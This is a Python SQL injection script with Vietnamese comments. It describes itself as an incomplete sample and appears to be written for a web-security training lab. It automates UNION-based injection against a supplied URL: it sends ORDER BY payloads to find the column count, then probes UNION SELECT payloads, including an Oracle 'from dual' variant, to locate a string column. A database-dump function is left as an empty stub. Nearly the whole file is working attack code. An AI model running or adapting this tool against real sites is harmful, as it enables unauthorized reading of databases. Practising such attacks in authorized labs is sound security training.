# Lưu ý: mẫu dưới đây chưa hoàn chỉnh
# Chức năng: công cụ thu thập số cột và kiểu dữ liệu của cột trong hệ quản trị cơ sở SQL.

import sys
import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def send_request(session:requests.Session, url:str) -> dict:
    try:
        # r = session.get(url, verify=False, proxies=PROXIES)
        r = session.get(url, verify=False)
        
        return r
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error in standard payload: {e}")
        return None


def detect_columns(session:requests.Session, url:str) -> list:
    print("[+] Detecting number of columns...")
    
    base_comment = "--"
    idx = 1

    while idx<100:
        payload = f"{url} ORDER BY {idx} {base_comment}"
        encoded_payload = urllib.parse.quote(payload)
        target = f"{url}%27{encoded_payload}"
        
        r = send_request(session, target)
        
        if (idx==1) and (r.status_code>=500) and (base_comment=="--"): 
            base_comment = "#"
            continue

        if (r.status_code>=500):
            print(f"[!] Column count: {idx-1}")
            return [idx-1, base_comment]
        
        idx+=1

    print("[!] Could not determine column count")
    return [None, base_comment]


def detect_string_column(session:requests.Session, url:str, cols:int, base_comment:str="--") -> dict:
    print("[+] Detecting string column...")
    payload_list:list = ["NULL"]*cols

    for idx in range(cols):
        payload_list[idx] = "\'abc\'"
        payload_str:str = ', '.join(payload_list)

        # Non-Oracle
        payload:str = f" union select {payload_str} {base_comment}"
        encoded_payload:str = urllib.parse.quote(payload)
        target:str = f"{url}{encoded_payload}"

        r = send_request(session, target)
        if (r.status_code == 200):
            return {
                "db_type": "non-oracle",
                "string_column_index": idx
            }

        # Oracle
        payload:str = f" union select {payload_str} from dual {base_comment}"
        encoded_payload:str = urllib.parse.quote(payload)
        target:str = f"{url}{encoded_payload}"

        r = send_request(session, target)
        if (r.status_code == 200):
            return {
                "db_type": "oracle",
                "string_column_index": idx
            }
        
        payload_list[idx] = "NULL"

    print("[!] No string column found")
    return None


def dump_database(session:requests.Session, url:str, cols:int, str_col_idx:int, base_comment:str="--") -> dict:
    pass


if __name__ == "__main__":
    if (len(sys.argv)!=2):
        print(f"[-] Usage: python {sys.argv[0]} <url_injection_point>")
        print(f"[-] Example: python {sys.argv[0]} \"https://xyz.web-security-academy.net/filter?category=Gifts'\"")
        sys.exit(-1)

    target_url:str = sys.argv[1]
    s = requests.Session()

    col_cnt, base_comment = detect_columns(s, target_url)
    if (col_cnt==0):
        sys.exit(1)
    
    result = detect_string_column(s, target_url, col_cnt, base_comment)
    if (result==None):
        sys.exit(1)
    print(f"[!] About database: {result}")
